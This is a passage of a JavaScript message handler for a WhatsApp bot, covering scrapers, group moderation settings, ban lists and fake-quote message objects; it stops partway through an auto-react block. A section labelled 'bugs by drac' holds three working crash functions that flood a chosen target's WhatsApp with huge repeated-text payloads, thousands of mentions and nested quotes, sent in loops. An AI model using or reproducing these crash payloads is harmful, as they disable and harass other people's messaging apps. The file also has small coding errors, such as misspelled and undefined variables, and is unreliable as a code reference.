
"use strict";
const toMs = require('ms')
const chalk = require('chalk')
const fs = require("fs")
const fse = require('fs-extra');
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios');
const yts = require("yt-search");
const gtts = require( 'node-gtts')
const ggs = require('google-it')
const canvacard = require("canvacard");
const speed = require("performance-now");
const ms = require("parse-ms");
const ytdl = require('ytdl-core');
const xyz = require("@xyzteams/scapers")
const os = require('os');
const { join,dirname } = require('path');
const path = require('path');
const { removeBackgroundFromImageFile } = require('remove.bg')
const { performance } = require('perf_hooks')
const fetch = require('node-fetch');
const cheerio = require( 'cheerio')
const request = require("request")
const anonfile = require('anonfile-lib')
const { Primbon } = require('scrape-primbon')

const primbon = new Primbon()
const { youtubeSearch, pinterest, mediafiredl,  lyricsv2,  lyrics, facebookdl, facebookdlv2, tiktokdl, tiktokdlv2, twitterdl, twitterdlv2, getZodiac, liputan6, googleIt, wallpaperv2, chord, googleImage,  jadwalTVNow,  gempa,  stickerTelegram, stickerLine, latinToAksara, aksaraToLatin, asmaulhusnajson, alquran, listJadwalSholat, gempaNow, instagramdl, instagramdlv3, instagramdlv2, instagramStory, savefrom, snapsave } = require('@bochilteam/scraper')

//----------------- LIB FILE ------------------\\
const { userXp, userLeveling, } = require("../lib/user");
const TicTacToe = require("../lib/tictactoe")
const { msgFilter, addSpam, SpamExpired, cekSpam} = require('../lib/antispam')
const { color } = require('../lib/color')
const { doodstream, terabox } = require('../lib/18+')

const photooxy = require('../lib/photooxy');
const {toFirstCase,isNumber,formatp,parseMention, resize,pickRandom, getRandom,generateProfilePicture, getCase,addCase,delCase,listCase,runtime,FileSize,h2k, GIFBufferToVideoBuffer,makeid,kyun,randomNomor,jsonformat, isUrl, fetchJson, sleep,getBuffer,} = require("../lib/myfunc");
const {floNime, UploadFileUgu, TelegraPh, uploadFile} = require('../lib/uploader')
const {  toAudio,  toPTT,  toVideo,  ffmpeg} = require('../lib/convert')
const { instagram4, capcutdl, mediafiredll, instagram2, instagram3, cekkuota, tele, ytPlayMp4, ytPlayMp3,igdl, kodepos, mediafire, ffstalk,textpro, mlstalk, Tiktok,surah,getSurah,listsurah,tafsirsurah, ephoto, emoji} = require('../lib/scraper') 
const { addblockcmd, deleteblockcmd, checkblockcmd } = require ("../lib/blockcmd");
const { addError,clearAllError, deleteError, checkError } = require("../lib/totalerror")
const { Nothing,Failed,Succes,addAutoClear,autoClearChat, checkDataName, createDataId, addDataId, removeDataId, checkDataId, getHit, cmdAdd, expiredCmd } = require("../lib/totalcmd");
const _sewa = require('../lib/sewa')
const _prem = require("../lib/premium");
const { clearAllBan, addBanned, unBanned, cekBannedUser } = require("../lib/banned")
const { jadibot, stopjadibot, listjadibot } = require('../lib/jadibot.js')

const imagenya = JSON.parse(fs.readFileSync('./json/image.json'))
const videonya = JSON.parse(fs.readFileSync('./json/video.json'))

 

//database 
const AntiSpam = db.data.antispam
const DataId = db.data.data
const ban = db.data.banned
const premium = db.data.premium
const listcmdblock = db.data.blockcmd 
const listerror = db.data.listerror
const hitnya = db.data.hittoday
const dash = db.data.dashboard 
const anonChat = db.data.anonymous 
const allcommand = db.data.allcommand 
const sewa = db.data.sewa
const spammer = []

const siminya = JSON.parse(fs.readFileSync('./database/simi.json'))

var publik = global.public

//=================================================//
module.exports = async(conn, dev, chatUpdate, store) => {
//console.log(chatUpdate.messages)
var multi = db.data.settings['settingbot'].multi
const m = dev
var Ownerin ="2348140944293@s.whatsapp.net"
var ownerNumber = [`${nomerOwner}@s.whatsapp.net`,`2349060853189@s.whatsapp.net`,`${conn.user.jid}`]
const Tnow = (new Date()/1000).toFixed(0)
const seli = Tnow - m.messageTimestamp.low
if (seli > Intervalmsg) return console.log((`The message from ${Intervalmsg} seconds ago was ignored to prevent spamming.`))
try {

const { type, now, args, sender, fromMe,from,botNumber,senderNumber,groupName,groupId,groupMembers,groupDesc,groupOwner,pushname,itsMe,isGroup,mentionByTag,mentionByReply,users,budy,content,body,} = dev

  ///_&-
if (multi){
var prefix = /^#.!¦|\\^/.test(body) ? body.match(/^#.!¦|\\^/gi) : '.'
var thePrefix = "Multi Prefix"
}                      

const isCmd = body.startsWith(prefix)
const isCommand = isCmd? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() :""
const q = args.join(' ')
const timeWib = moment().tz('Africa/Lagos').format('HH:mm:ss')
const isOwner = ownerNumber.includes(sender) || checkDataId ("owner", sender, DataId) 
const command = ( _prem || isOwner)? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCommand
const theOwner = sender == Ownerin 
const timestampp = speed();
const latensi = speed() - timestampp
const quoted = dev.quoted ? dev.quoted : dev
const mime = (quoted.msg || quoted).mimetype || ''
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001) 
const numberQuery = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
const Input = (mentionByTag && mentionByTag[0]) ? mentionByTag[0] 
                : (mentionByReply || q ? numberQuery : false);

//const Input = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
const replyCommand = isCmd? isCmd : allcommand.includes(toFirstCase(command))
const selectedButton = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : ''



const user = global.db.data.users[m.sender]
const chat = isGroup? global.db.data.chats[m.chat] : false
const isSimi = isGroup ? siminya.includes(m.chat) : false 
const kickon = global.db.data.kickon[m.chat]
const botRun = global.db.data.others['runtime']
const botTime = (new Date - botRun.runtime) || "Tidak terdeteksi"
const runTime = clockString(botTime)

const dracReply = (teks) => {
            blue.sendMessage(from, {
                text: teks
            }, {
                quoted: m
            })
        }
 

//Waktu
let d = new Date();
let locale = 'en-NG'; // Change to Nigerian English
let gmt = new Date(0).getTime() - new Date('1 January 2021').getTime();
let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5];
let week = d.toLocaleDateString(locale, { weekday: 'long' });
const calender = d.toLocaleDateString("en-NG", {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
});


  function clockString(ms) {
let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
var dDisplay = d > 0 ? d + (d == 1 ? " Days, " : " Days, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " Hours, " : " Hours, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " Minutes, " : " Minutes, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " Seconds" : " Seconds") : "";
let time = d > 0 ? dDisplay + hDisplay + mDisplay + sDisplay : hDisplay + mDisplay + sDisplay
return time
}





if (global.autoread) {
    conn.readMessages([m.key]);  // Automatically read the message
}

if (global.autotype) {
conn.sendPresenceUpdate('composing', from)
// automatically shows always typing
}


// Global variable to store the emoji to react with
global.statusEmoji = null;  // Default to no emoji set

// Function to auto-view statuses and react with the selected emoji
async function autoViewStatusAndReact() {
    if (!global.autoviewstatus) return; // Exit if autoviewstatus is disabled
    if (!global.statusEmoji) return;   // Exit if no emoji has been set

    try {
        const statuses = await conn.fetchStatus(); // Fetch all status updates
        if (statuses && statuses.length > 0) {
            for (let status of statuses) {
                await conn.readMessages([status.key]); // Mark each status as viewed

                // React to the status with the selected emoji
                await conn.sendMessage(status.key.remoteJid, {
                    react: {
                        text: global.statusEmoji,  // Use the emoji set by the user
                        key: status.key
                    }
                });
            }
        }
    } catch (error) {
        console.error("Failed to auto-view and react to status updates:", error);
    }
}

// Periodic check to auto-view and react to statuses
setInterval(autoViewStatusAndReact, 10000); // Every 10 seconds









//if (typeof chat !== 'object') global.db.data.chats[m.chat] = {}
if (isGroup && chat) {
if (!('name' in chat)) chat.name = groupNmae
if (!isNumber(chat.add)) chat.add = 0
if (!('welcome' in chat)) chat.welcome = true
if (!('detect' in chat)) chat.detect = true
if (!('sWelcome' in chat)) chat.sWelcome = ''
if (!('sBye' in chat)) chat.sBye = ''
if (!('sPromote' in chat)) chat.sPromote = ''
if (!('sDemote' in chat)) chat.sDemote = ''
if (!('desc' in chat)) chat.desc = true
if (!('descUpdate' in chat)) chat.descUpdate = true
if (!('stiker' in chat)) chat.stiker = false
if (!("antibot" in chat)) chat.antibot = false
if (!('antiimage' in chat))chat.antiimage = false
if (!('antisticker' in chat))chat.antisticker = false
if (!('antivideo' in chat))chat.antivideo = false;
if (!('antiaudio' in chat))chat.antiaudio = false;
if (!('antiLink' in chat)) chat.antiLink = true
if (!isNumber(chat.expired)) chat.expired = 0
if (!('antiBadword' in chat)) chat.antiBadword = true
if (!('antispam' in chat)) chat.antispam = true
if (!('antitroli' in chat)) chat.antitroli = false
if (!('antivirtex' in chat)) chat.antivirtex = false
if (!('antiwame' in chat)) chat.antiwame = false
if (!('antitoxic' in chat)) chat.antitoxic = false
if (!('viewonce' in chat)) chat.viewonce = false
if (!('nsfw' in chat)) chat.nsfw = false
if (!("rpg" in chat)) chat.rpg = false;
if (!('clear' in chat)) chat.clear = false
if (!isNumber(chat.cleartime)) chat.clearTime = 0
} else if (isGroup) global.db.data.chats[m.chat] = {
name: groupName,
add: 0,
welcome: true,
detect: true,
sWelcome: '',
sBye: '',
sPromote: '',
sDemote: '',
desc: true, 
descUpdate: true,
antibot: false,
antiimage: false,
antisticker: false,
antiaudio: false,
antivideo: false,
autostiker: false,
antilink: false,
antilinkgc: true,
antidelete: false,
antiasing: false,
banchat: false,
expired: 0,
antibadword: true,
antispam: true,
antitroli: false,
antivirtex: false,
antitoxic: false,
antipromosi: false,
antihidetag: false,
viewonce: false,
nsfw: false,
rpg: false,
clear: false,
clearTime: 0
}

const settings = global.db.data.settings['settingbot']
if(settings){
  
//Auto set
if (!isNumber(settings.status)) setting.status = new Date() * 1
if (!('setmenu' in settings)) settings.setmenu = "document"
if (!('docType' in settings)) settings.docType = "docx"
if (!('Qoted' in settings)) settings.Qoted = "ftoko"
if (!('autoBio' in settings)) settings.autoBio = true
if (!('multi' in settings)) settings.multi = true
if (!('prefix' in settings)) settings.prefix = "!"
if (!('fake' in settings)) settings.fake = botName
if (!('autoblockcmd' in settings)) settings.autoblockcmd = false
if (!('fake1' in settings)) settings.fake1 = "DRACULA FX"
if (!('replyType' in settings)) settings.replyType = "web"
if (!('setwelcome' in settings)) settings.setwelcome = "type11"
if (!('autoReport' in settings)) settings.autoReport = true
if (!('autoLevel' in settings)) settings.autoLevel = true
if (!('autoSticker' in settings)) settings.autoSticker = false
if (!('publik' in settings)) settings.publik = true
 
} else { global.db.data.settings['settingbot'] = {
status: new Date() * 1, 
setmenu: "document",
docType: "docx",
Qoted: "ftoko",
autoBio: true,
multi: true,
prefix: "!",
fake: botName,
autoblockcmd: false,
replyType: "web",
setwelcome: "type11",
autoReport: true,
autoLevel: true,
autoSticker: false,
publik : true
}
}

//Security / Keamanan
const groupMetadata = isGroup ? await conn.groupMetadata(m.chat).catch(e => {}) : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const isGroupOwner = isGroup ? groupMetadata.owner : ''
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAntiLink = isGroup ? db.data.chats[from].antilink : false
const isWelcome = isGroup ? db.data.chats[from].welcome : true
const isAntidelete = isGroup ? db.data.chats[from].antidelete : false
const isKickarea = isGroup ? db.data.chats[from].antiasing : false
const isAntilinkGc = isGroup ? db.data.chats[from].antilinkgc : true
const isBanchat = isGroup ? db.data.chats[from].banchat : false 
const isAntiVirtex = isGroup ? db.data.chats[from].antivirtex : false
const isAntiWame = isGroup ? db.data.chats[from].antiwame : false
const isAntiToxic = isGroup ? db.data.chats[from].antitoxic : false
const isBanned = sender? cekBannedUser (senderNumber, ban) : false
const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
const gcount = isPremium ? gcounti.prem : gcounti.user
const isAntiViewOnce = isGroup ? db.data.chats[from].viewonce : false
const isAntiImage = isGroup ? db.data.chats[from].antiimage : false
const isAntiVideo = isGroup ? db.data.chats[from].antivideo : false
const isAntiAudio = isGroup ? db.data.chats[from].antiaudio : false
const isAntiSticker = isGroup ? db.data.chats[from].antisticker : false
const isAntiBot = isGroup ? db.data.chats[from].antibot : false
const isAntiNsfw = isGroup ? db.data.chats[from].nsfw : false
const isAntiPromosi= isGroup ? db.data.chats[from].antipromosi : false
const isGame = isGroup ? db.data.chats[from].game : false
const thumb = fs.readFileSync('./stik/thumb.jpeg')
//const isHit = db.data.users[sender].hit > 1? true : false 
  
 //User 
const userLevel = user? db.data.users[m.sender].level : true
const userExp = user? db.data.users[m.sender].exp : true
const userId = user? db.data.users[m.sender].id : true
const amountExp = Math.floor(Math.random() * 10) + 50
const requiredExp = 10000 * userLevel
const userPersen = userExp/requiredExp*100
const userVerified = user? db.data.users[m.sender].date : true

  //Ucapan Waktu  
if(timeWib < "23:59:00"){ var ucapanWaktu = 'Wagwan 🌃' }
if(timeWib < "19:00:00"){ var ucapanWaktu = 'Wagwan 🌃'}
if(timeWib < "18:00:00"){ var ucapanWaktu = 'Wagwan 🌇'}
if(timeWib < "15:00:00"){ var ucapanWaktu = 'Wagwan 🏙️'}
if(timeWib < "11:00:00"){ var ucapanWaktu = 'Wagwan 🌅'}
if(timeWib < "06:00:00"){ var ucapanWaktu = 'Wagwan 🌅'  }      
// Presence Online



let colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isText = (type == 'conversation')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isViewOnce = (type == 'viewOnceMessageV')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
const isHanMedia = m.mtype
const pesilit = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : ''
const messagesD = pesilit.slice(0).trim().split(/ +/).shift().toLowerCase()
const messagesC = pesilit.slice(0).trim()
/*/Console Log
try{
var virus = m.message.extendedTextMessage.contextInfo.externalAdReply.title.length > 40000
}catch{
var virus = 100
}

if(type == "groupInviteMessage" && m.message.groupInviteMessage.caption.length > 8000||  type == "contactMessage" && m.message.contactMessage.displayName.length > 8000 || type == "imageMessage" && m.message.imageMessage.caption.length > 8000 || budy.length > 8000 && !itsMe  || type == "extendedTextMessage" && virus > 8000 && !itsMe ||  type == "productMessage" && m.message.productMessage.product.description.length > 8000 && !itsMe ||  type == "listMessage" && !itsMe) {
if(isGroup && isBotGroupAdmins) conn.sendMessage(from, { delete: m.key})
if(!isGroup && isBotGroupAdmins) conn.chatModify({ clear: { messages: [{ id: m.id, fromMe: sender == isBotGroupAdmins,timestamp: m.messageTimestamp }] } }, sender, [])
console.log(chalk.bgRedBright(color("[ VIRTEXT ]", "black")),`Length: ${budy.length} from ${senderNumber} ${isGroup? `Group ${groupName}`: ""}`)
}*/
    


if (!isGroup && !isCmd) console.log(color("[PRIVATE]", "greenyellow"), color(moment.tz('Africa/Lagos').format('HH:mm'), "green"), color(budy, "cyan"), color('From', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && !isCmd) console.log(color("[GROUP]", "gold"), color(moment.tz('Africa/Lagos').format('HH:mm'), "green"), color(budy, "cyan"), color('From', 'gold'), color(`${pushname}`, 'orange'), color('in group', 'purple'), color(groupName, "deeppink"))
if (!isGroup && isCmd) console.log(color("[CMD]", "blue"), color(moment.tz('Africa/Lagos').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('From', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && isCmd) console.log(color("[CMD]", "blue"), color(moment.tz('Africa/Lagos').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('From', 'gold'), color(`${pushname}`, 'orange'), color('in group', 'purple'), color(groupName, "deeppink"))
 
 // Pengubah teks
  const Ehztext = (text, style = 1) => {
    var abc = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
    var ehz = {
      1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
    };
    var replacer = [];
    abc.map((v, i) =>
      replacer.push({
        original: v,
        convert: ehz[style].split('')[i]
      })
    );
    var str = text.toLowerCase().split('');
    var output = [];
    str.map((v) => {
      const find = replacer.find((x) => x.original == v);
      find ? output.push(find.convert) : output.push(v);
    });
    return output.join('');
  };
//×××××××××××××××××××××××××//



//FAKE REPLY  
const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}

const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}
const ehan = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                "contactMessage": {
                    'displayName': `${pushname}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;menhera,;;;\nFN: ehanz Ai\nitem1.TEL;waid=${m.sender.split("@")[0]}:+${m.sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': null,
                    thumbnail: null,
                    sendEphemeral: true
                }   
            }
        }
const ftoko = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg')},"title": `${pushname}`,"description": `${ucapanWaktu} kak`,"currencyCode": "IDR", "priceAmount1000": `${pushname}`, "retailerId": `Rp10`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const ftext = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const ftroli = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 200, status: 1,surface : 2,message: `${fake}\n${ucapanWaktu} kak`,orderTitle: `${ucapanWaktu} kak`,thumbnail: fs.readFileSync('./stik/thumb.jpeg'), sellerJid: `0@s.whatsapp.net`}}}
const floc = { key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "2349060853189-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const fdoc = { key : { participant : '0@s.whatsapp.net'}, message: { documentMessage: { title: 'Halo bang', jpegThumbnail: fs.readFileSync('./stik/thumb.jpeg')}}}
const fsimi = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: {"imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": 'simi botz', "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}


const path = './database/bannedUsers.json'; // File to store banned user IDs

// Ensure the ban list file exists
if (!fs.existsSync(path)) {
    fs.writeFileSync(path, JSON.stringify([]));
}

// Load the ban list
const loadBanList = () => JSON.parse(fs.readFileSync(path, 'utf8'));

// Save the updated ban list
const saveBanList = (banList) => fs.writeFileSync(path, JSON.stringify(banList, null, 2));

// Check if a user is banned
const isUserBanned = (userId) => {
    const banList = loadBanList();
    return banList.includes(userId);
};

// Ban a user
const banUser = (userId) => {
    const banList = loadBanList();
    if (!banList.includes(userId)) {
        banList.push(userId);
        saveBanList(banList);
    }
};

// Unban a user (optional utility function)
const unbanUser = (userId) => {
    const banList = loadBanList();
    const updatedList = banList.filter((id) => id !== userId);
    saveBanList(updatedList);
};


// Automatically delete banned users' messages
// Ensure global ban storage is initialized
global.bannedUsers = global.bannedUsers || {};

// Check for messages from banned users and delete them
if (
    isCmd || 
    isText || 
    isImage || 
    isVideo || 
    isSticker || 
    isAudio || 
    isMedia || 
    isViewOnce || 
    isQuotedImage || 
    isQuotedVideo || 
    isQuotedSticker || 
    isQuotedAudio || 
    isQuotedText || 
    isQuotedTag || 
    isQuotedReply || 
    isQuotedViewOnce
) {
    global.bannedUsers[m.chat] = global.bannedUsers[m.chat] || [];
    if (global.bannedUsers[m.chat].includes(m.sender)) {
        try {
            await conn.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: m.key.id, 
                    participant: m.sender 
                } 
            });
        } catch (error) {
            console.error("Failed to delete message from banned user:", error);
        }
    }
}









 //SetReply
const setReply = async(teks,member = []) =>{
let photo = pickRandom(fotoRandom)

let contextInfo = {
forwardingScore: 99999,
isForwarded: true,
mentionedJid: member,
forwardedNewsletterMessageInfo: {
          newsletterJid,
          serverMessageId: 100,
          newsletterName
          },
externalAdReply:{
showAdAttribution: true,
title: botName,
body:`${ucapanWaktu}  ${pushname}`,
previewType:"PHOTO",
thumbnailUrl:"https://pomf2.lain.la/f/dbogd7ch.jpg",
sourceUrl: `${web}`
}
}

  if(replyType === "web"){
  conn.sendMessage(from, {contextInfo, text: teks}, { quoted: fcall})
  } else if(replyType === "web2"){
  conn.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, mediaType: 3,  renderLargerThumbnail : true,thumbnailUrl: photo,sourceUrl: `https://wa.me/${nomerOwner}?text=Wagwan+Bro`}}, text: teks},{quoted: m})
  } else if(replyType === "mess"){
  conn.sendMessage(from, { id: m.key.id, contextInfo: { forwardingScore: 50, isForwarded: true },showAdAttribution: true,text: teks },{quoted: m});
  } else if(replyType === "ftoko"){
  conn.sendMessage(from,{text: teks}, { quoted: ftoko });
  } else if(replyType === "document"){conn.sendMessage(m.chat, {
	document: fs.readFileSync("./package.json"),
	fileName: '© 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳',
	mimetype: "application/vnd.ms-excel",
	fileLength: 999999999,
	bpageCount: 10903,	
  
  caption: Ehztext(teks),
  contextInfo: {
  mentionedJid: [sender],
forwardingScore: 9999999, 
isForwarded: true, 
  externalAdReply: {
	showAdAttribution: false,
	title: botName,
	body: `${ucapanWaktu}  ${pushname}`,
	thumbnailUrl: photo,
	mediaType: 1,
  sourceUrl: `${web}`,
	}}}, { quoted: m,ephemeralExpiration: 86400});
  } else {
  conn.sendMessage(from, {text: "Error SetReply Not Found"})
  }
  }
//Message
require("./message.js")(senderNumber, prefix,command,setReply)
const reply = async(teks) => {conn.sendMessage(from, {text: teks, mentions: await ments(teks)},{quoted:fcall})}
const sendvn = (teks) => {
conn.sendMessage(from, {audio: {url: teks},ptt: true, waveform: [0,0,50,0,0,0,10,80,10,60,10,99,60,30,10,0,0,0],mimetype: 'audio/mpeg'},{quoted:m})		
} 
const sendSticker = (teks) => {
conn.sendMessage(from, {sticker: {url: teks}},{quoted: m})
}
const sendMusic = (teks) => {
let img = { url : "https://pomf2.lain.la/f/dbogd7ch.jpg", type : "image/jpeg" }
let url = `https://whatsapp.com/channel/0029Vap32qXLikg91i4TmH3K`

let contextInfo = {
externalAdReply: {
showAdAttribution: true, 
title: `⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻`, 
body: `   ━━━━⬤──────────     `,
description: 'Now Playing ....',
mediaType: 2,
thumbnailUrl: img.url,
mediaUrl: url
}
}
	
conn.sendMessage(from, { contextInfo, mimetype: 'audio/mp4', audio: teks}, { quoted: m })
}





//bugs by drac
const userIdf = args[0] + '@s.whatsapp.net';

async function zenonbug1(target) {
    function isValidJid(jid) {
        return /^[0-9]+@s\.whatsapp\.net$|^[0-9]+-[0-9]+@g\.us$/.test(jid);
    }

    if (!isValidJid(target)) {
        console.error("Invalid JID:", target);
        return;
    }

    const validMentionedJids = Array.from({ length: 5 }, () => "1234567890@s.whatsapp.net"); // Replace with valid JIDs

    try {
        await conn.relayMessage(target, {
            groupMentionedMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            locationMessage: {
                                degreesLatitude: 414058.5,
                                degreesLongitude: 131518.0
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: zenontext2 + `${"@DraculaCrash".repeat(50000)}`,
                            contextInfo: { mentionedJid: ["1234567890@s.whatsapp.net"] }
                        },
                        nativeFlowMessage: {},
                        contextInfo: {
                            mentionedJid: validMentionedJids,
                            groupMentions: [{
                                groupJid: "120363301095727346@newsletter",
                                groupSubject: "𝐑𝐞𝐚𝐥🦣"
                            }]
                        }
                    }
                }
            }
        }, { participant: { jid: target } }, { messageId: null });
        console.log("Drac Crash Android");
    } catch (error) {
        console.error("Error in zenonbug1:", error);
    }
}

async function ultimateCrash(userId) {
    const massiveText = "🤡".repeat(100000); // Create an excessively large payload
    const massiveMention = Array.from({ length: 1000 }, () => "0@s.whatsapp.net"); // Overload with mentions

    for (let i = 0; i < 50; i++) {
        await conn.relayMessage(userId, {
            extendedTextMessage: {
                text: massiveText,
                contextInfo: {
                    mentionedJid: massiveMention, // Add excessive mentions
                },
            },
        }, { participant: { jid: userId } });
    }

    console.log("Ultimate crash payload sent.");
}

async function demonicCrash(userId) {
    const demonicText = `🔥👹${"DARK-FX".repeat(100000)}💀🔥`; // Insanely large payload
    const recursiveMention = Array.from({ length: 5000 }, () => userId); // Recursively mention the target thousands of times
    const nestedContext = {
        contextInfo: {
            quotedMessage: {
                extendedTextMessage: {
                    text: `👹${"RECURSION".repeat(5000)}👹`, // Deeply nested recursive data
                    contextInfo: {
                        mentionedJid: recursiveMention, // Overwhelm with mentions
                    },
                },
            },
        },
    };

    for (let i = 0; i < 100; i++) {
        await conn.relayMessage(userId, {
            extendedTextMessage: {
                text: demonicText, // Huge payload
                contextInfo: nestedContext, // Deeply nested metadata
            },
        }, { participant: { jid: userId } });
    }

    console.log("Demonic crash payload unleashed.");
}






// AUTO SHOLAT 
conn.autoshalat = conn.autoshalat ? conn.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.id : m.sender
	let id = m.chat 
    if(id in conn.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Africa/Lagos"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = Ehztext(`Hi ${pushname},\nThe time for *${prayer}* has arrived, take ablution and pray immediately🙂.\n\n*${time}*\n_for the Makassar area and surrounding areas._`)
    conn.autoshalat[id] = [
    setReply(caption),
    setTimeout(async () => {
    delete conn.autoshalat[m.chat]
    }, 57000)
    ]
    }
    }
    
    
    
    
    //auto react code
if (global.autoReactEnabled === true) {
